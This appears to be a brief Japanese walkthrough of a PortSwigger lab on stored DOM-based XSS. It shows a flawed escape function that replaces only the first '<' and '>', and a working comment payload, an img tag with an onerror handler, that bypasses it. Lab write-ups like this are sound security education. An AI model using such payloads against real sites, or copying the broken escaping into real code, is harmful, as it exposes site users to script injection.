# 保存された DOM XSS

次のハッキングラボを実施します  
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

- 1. ハッキングラボにアクセスします
- 2. 任意のワードで検索します
- 3. 検索結果のページでソースを確認すると、以下のスクリプトでコメントの一部文字をエスケープしていることが分かります

```html
'/resources/js/loadCommentsWithVulnerableEscapeHtml.js
```

エスケープ関数

```js
function escapeHTML(html) {
  return html.replace("<", "&lt;").replace(">", "&gt;");
}
```

- 4.  replace はファーストマッチングなので、以下でコメントを書き込むとスクリプトの実行が確認できます

```html
<><img src="1" onerror="alert(1)" />
```
